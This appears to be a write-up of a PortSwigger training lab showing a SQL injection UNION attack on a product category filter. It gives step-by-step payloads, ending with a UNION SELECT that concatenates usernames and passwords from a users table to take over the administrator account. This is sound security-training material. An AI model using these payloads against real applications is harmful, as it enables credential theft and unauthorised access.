
# SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Hint: You can find some useful payloads on our SQL injection cheat sheet.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/union-attacks

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


We see there is 1 value displayed in the table, the name of the product:



<img width="1228" height="713" alt="1" src="https://github.com/user-attachments/assets/04cb0f56-0f68-43a0-8a6a-12fd52e8d97c" />


We find these payload are valid to display the 4 items in Lifestyle and the second all the items:

```
/filter?category=Lifestyle'--
/filter?category=Lifestyle'+or+1=1--
```

<img width="1521" height="790" alt="2" src="https://github.com/user-attachments/assets/42d78d95-6b1c-4786-9a95-e65f9ae01976" />


Also, that there are 2 columns returned by the query and we can do a UNION attack with:

```
/filter?category=Lifestyle'+union+all+select+NULL,NULL--
```


<img width="1515" height="794" alt="3" src="https://github.com/user-attachments/assets/7871c332-52a9-447b-b41c-f422638a7d6a" />


We can print strings using the second column in the attack and concatenate strings using CONCAT:

```
/filter?category=Lifestyle'+union+all+select+NULL,CONCAT('foo','bar')--
```


<img width="1514" height="793" alt="4" src="https://github.com/user-attachments/assets/715216bb-556f-4b43-8237-72fb3bd91990" />


We can get content from both columns using SELECT CONCAT(username,':',password) from users:

```
/filter?category=Lifestyle'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
```


<img width="1513" height="816" alt="5" src="https://github.com/user-attachments/assets/0c579d40-a9d3-4e81-83fd-5222c8a5ad39" />

